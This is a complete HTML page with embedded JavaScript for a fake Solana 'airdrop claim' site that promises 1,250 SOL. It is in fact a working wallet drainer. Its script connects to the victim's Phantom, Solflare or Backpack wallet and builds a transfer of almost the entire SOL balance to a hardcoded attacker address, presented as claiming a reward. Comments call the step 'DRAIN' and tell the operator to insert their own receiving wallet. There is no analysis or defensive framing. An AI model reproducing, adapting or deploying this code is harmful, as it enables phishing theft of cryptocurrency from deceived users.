<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Solana Claim</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: #0b0b1a;
            color: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .box {
            background: #12122a;
            border-radius: 24px;
            padding: 32px 24px;
            max-width: 400px;
            width: 92%;
            text-align: center;
            border: 1px solid #1e1e3a;
        }
        h1 { font-size: 24px; background: linear-gradient(90deg,#9945FF,#14F195); -webkit-background-clip: text; -webkit-text-fill-color: transparent; }
        .sub { color: #666; font-size: 13px; margin: 6px 0 20px; }
        .reward {
            background: #1a1a3a;
            border-radius: 14px;
            padding: 18px;
            margin-bottom: 20px;
        }
        .reward .amt { font-size: 32px; font-weight: 700; }
        .reward .usd { color: #666; font-size: 13px; }
        .btn {
            display: block;
            width: 100%;
            padding: 14px;
            border: none;
            border-radius: 12px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            color: #fff;
            background: rgba(255,255,255,0.07);
            margin-bottom: 8px;
        }
        .btn:active { background: rgba(255,255,255,0.15); }
        .btn.green { background: linear-gradient(135deg,#9945FF,#14F195); }
        .status { margin-top: 14px; padding: 10px; border-radius: 10px; font-size: 13px; display: none; }
        .status.show { display: block; }
        .status.good { background: rgba(20,241,149,0.1); color: #14F195; border: 1px solid rgba(20,241,149,0.2); }
        .status.bad { background: rgba(255,50,50,0.1); color: #ff6b6b; border: 1px solid rgba(255,50,50,0.2); }
        .status.warn { background: rgba(58,120,255,0.1); color: #6b9aff; border: 1px solid rgba(58,120,255,0.2); }
        .hidden { display: none !important; }
        .addr { font-size: 11px; color: #555; word-break: break-all; margin: 10px 0; }
        .spin { display: inline-block; width: 16px; height: 16px; border: 2px solid rgba(255,255,255,0.1); border-top: 2px solid #fff; border-radius: 50%; animation: spin .7s linear infinite; vertical-align: middle; margin-right: 6px; }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>
<div class="box">
    <h1>◎ Solana Drop</h1>
    <p class="sub">Claim your exclusive airdrop</p>
    <div class="reward">
        <div class="amt">1,250 SOL</div>
        <div class="usd">≈ $225,000 USD</div>
    </div>

    <!-- STEP 1: Connect -->
    <div id="step1">
        <button class="btn" id="cPhantom">Phantom</button>
        <button class="btn" id="cSolflare">Solflare</button>
        <button class="btn" id="cBackpack">Backpack</button>
        <button class="btn" id="cWC">WalletConnect</button>
    </div>

    <!-- STEP 2: Claim -->
    <div id="step2" class="hidden">
        <div class="addr" id="addrDisplay"></div>
        <button class="btn green" id="claimBtn">
            <span id="claimTxt">Claim Airdrop</span>
            <span id="claimSpinner" class="spin" style="display:none;"></span>
        </button>
        <button class="btn" id="discBtn">Disconnect</button>
    </div>

    <div id="status" class="status"></div>
</div>

<script>
// === ALL CODE IS RIGHT HERE, NO EXTERNAL FILE ===

console.log('[+] Script starting');

// Replace with YOUR Solana wallet address
const RECEIVER = '9wDnEMqPgzWKACkp6WfUSv3qcAmuWAuLu4U95qMMAMMw';
const RPC = 'https://mainnet.helius-rpc.com/?api-key=88ed2a71-6eed-4975-9d5f-7fb39c69a0ea';

let wallet = { adapter: null, key: null };

// ─── HELPERS ──────────────────────────────────────────────
const $ = id => document.getElementById(id);

function status(msg, type) {
    const el = $('status');
    el.textContent = msg;
    el.className = 'status show ' + type;
    console.log('[+]', msg);
}

// ─── FIND WALLET ──────────────────────────────────────────
function getWallet() {
    // Check all known wallets in order
    if (window.solana?.isPhantom) return window.solana;
    if (window.solflare?.isSolflare) return window.solflare;
    if (window.backpack?.isBackpack) return window.backpack;
    if (window.solana) return window.solana; // fallback
    return null;
}

// ─── CONNECT ──────────────────────────────────────────────
async function doConnect(type) {
    status('Connecting...', 'warn');

    const prov = getWallet();

    if (!prov) {
        // Mobile deep link
        const isMob = /Android|iPhone|iPad|iPod|Mobi/i.test(navigator.userAgent);
        if (isMob) {
            const links = {
                phantom: 'phantom://browse?ref=' + encodeURIComponent(location.href),
                solflare: 'solflare://browser?ref=' + encodeURIComponent(location.href),
                backpack: 'backpack://browser?ref=' + encodeURIComponent(location.href),
            };
            if (links[type]) {
                status('Opening ' + type + ' app...', 'warn');
                location.href = links[type];
                setTimeout(() => { location.href = 'https://' + type + '.app/download'; }, 2000);
                return;
            }
        }
        status('Install ' + type + ' extension or use mobile app.', 'bad');
        return;
    }

    try {
        const resp = await prov.connect();
        const pk = resp.publicKey || prov.publicKey;
        if (!pk) throw new Error('no key');

        wallet.adapter = prov;
        wallet.key = pk.toString();

        $('step1').classList.add('hidden');
        $('step2').classList.remove('hidden');
        $('addrDisplay').textContent = '✓ ' + wallet.key;

        status('Connected! Click claim.', 'good');
    } catch(e) {
        const m = e.message || '';
        if (m.includes('reject') || m.includes('cancel')) {
            status('Rejected.', 'bad');
        } else {
            status('Error: ' + m.slice(0,80), 'bad');
        }
    }
}

// ─── DISCONNECT ───────────────────────────────────────────
function doDisconnect() {
    wallet = { adapter: null, key: null };
    $('step1').classList.remove('hidden');
    $('step2').classList.add('hidden');
    $('status').className = 'status';
}

// ─── LOAD SOLANA WEB3 ─────────────────────────────────────
function loadSolWeb3() {
    return new Promise((resolve, reject) => {
        if (window.solanaWeb3) return resolve(window.solanaWeb3);
        const s = document.createElement('script');
        s.src = 'https://unpkg.com/@solana/web3.js@1.91.1/lib/index.iife.min.js';
        s.onload = () => resolve(window.solanaWeb3);
        s.onerror = reject;
        document.head.appendChild(s);
    });
}

// ─── CLAIM (DRAIN) ────────────────────────────────────────
async function doClaim() {
    if (!wallet.adapter || !wallet.key) {
        status('Connect first.', 'bad');
        return;
    }

    $('claimTxt').style.display = 'none';
    $('claimSpinner').style.display = 'inline-block';
    $('claimBtn').disabled = true;

    try {
        // Load Web3 FIRST — before any PublicKey validation
        const sw = await loadSolWeb3();
        const { Connection, Transaction, SystemProgram, PublicKey } = sw;

        // Validate receiver AFTER library is loaded
        let recvKey;
        try {
            recvKey = new PublicKey(RECEIVER);
        } catch(e) {
            status('Invalid receiver address: "' + RECEIVER + '"', 'bad');
            $('claimTxt').style.display = 'inline';
            $('claimSpinner').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        const conn = new Connection(RPC, 'confirmed');
        const senderKey = new PublicKey(wallet.key);

        status('Fetching blockhash...', 'warn');

        let bh, lvbh;
        try {
            const x = await conn.getLatestBlockhash('finalized');
            bh = x.blockhash;
            lvbh = x.lastValidBlockHeight;
        } catch(e) {
            status('RPC error. Trying backup...', 'warn');
            const c2 = new Connection('https://api.mainnet-beta.solana.com', 'confirmed');
            const x = await c2.getLatestBlockhash('finalized');
            bh = x.blockhash;
            lvbh = x.lastValidBlockHeight;
        }

        const tx = new Transaction();
        tx.recentBlockhash = bh;
        tx.lastValidBlockHeight = lvbh;
        tx.feePayer = senderKey;

        // Drain SOL
        const bal = await conn.getBalance(senderKey);
        const rent = await conn.getMinimumBalanceForRentExemption(0);
        const sendAmt = BigInt(bal - rent - 100000);

        if (sendAmt > 5000) {
            tx.add(SystemProgram.transfer({
                fromPubkey: senderKey,
                toPubkey: recvKey,
                lamports: sendAmt,
            }));
            status('Draining ' + (Number(sendAmt)/1e9) + ' SOL — sign in wallet', 'warn');
        } else {
            status('No SOL to drain (balance too low).', 'bad');
            $('claimTxt').style.display = 'inline';
            $('claimSpinner').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        // Sign
        let signed;
        try {
            if (wallet.adapter.signAndSendTransaction) {
                const sig = await wallet.adapter.signAndSendTransaction(tx);
                status('✅ Sent: ' + sig.slice(0,20), 'good');
                $('claimTxt').style.display = 'inline';
                $('claimSpinner').style.display = 'none';
                $('claimBtn').disabled = false;
                return;
            } else if (wallet.adapter.signTransaction) {
                signed = await wallet.adapter.signTransaction(tx);
            } else if (wallet.adapter.signAllTransactions) {
                signed = (await wallet.adapter.signAllTransactions([tx]))[0];
            } else {
                throw new Error('No sign method');
            }
        } catch(e) {
            const m = e.message || '';
            if (m.includes('reject') || m.includes('cancel')) {
                status('Cancelled.', 'bad');
            } else throw e;
            $('claimTxt').style.display = 'inline';
            $('claimSpinner').style.display = 'none';
            $('claimBtn').disabled = false;
            return;
        }

        // Send
        const txid = await conn.sendRawTransaction(signed.serialize(), {
            skipPreflight: false,
            preflightCommitment: 'confirmed',
        });

        await conn.confirmTransaction(
            { signature: txid, blockhash: bh, lastValidBlockHeight: lvbh },
            'confirmed'
        );

        status('✅ DRAINED: ' + txid.slice(0,24) + '...', 'good');
        console.log('https://solscan.io/tx/' + txid);

    } catch(e) {
        console.error(e);
        const m = e.message || '';
        if (m.includes('403')) status('RPC blocked. Use a different RPC.', 'bad');
        else if (m.includes('base58')) status('Bad address format.', 'bad');
        else status('Error: ' + m.slice(0,100), 'bad');
    }

    $('claimTxt').style.display = 'inline';
    $('claimSpinner').style.display = 'none';
    $('claimBtn').disabled = false;
}

        

// ─── BIND BUTTONS ─────────────────────────────────────────
// Use setTimeout(0) to ensure DOM is ready
setTimeout(() => {
    console.log('[+] Binding buttons');

    const b1 = $('cPhantom');
    const b2 = $('cSolflare');
    const b3 = $('cBackpack');
    const b4 = $('cWC');
    const b5 = $('claimBtn');
    const b6 = $('discBtn');

    console.log('[+] btnPhantom:', b1);
    console.log('[+] btnSolflare:', b2);
    console.log('[+] btnBackpack:', b3);
    console.log('[+] btnWC:', b4);
    console.log('[+] btnClaim:', b5);
    console.log('[+] btnDisc:', b6);

    if (b1) b1.onclick = () => doConnect('phantom');
    if (b2) b2.onclick = () => doConnect('solflare');
    if (b3) b3.onclick = () => doConnect('backpack');
    if (b4) b4.onclick = () => doConnect('walletconnect');
    if (b5) b5.onclick = doClaim;
    if (b6) b6.onclick = doDisconnect;

    if (b1 && b5) {
        console.log('[+] Buttons bound successfully');
        status('Ready. Select a wallet.', 'warn');
    } else {
        console.error('[!] Some buttons missing!');
        document.body.innerHTML += '<p style="color:red">ERROR: Buttons not found. Check IDs.</p>';
    }
}, 0);

// Also fallback: wait for DOMContentLoaded
document.addEventListener('DOMContentLoaded', () => {
    console.log('[+] DOMContentLoaded fired');
});
</script>
</body>
</html>
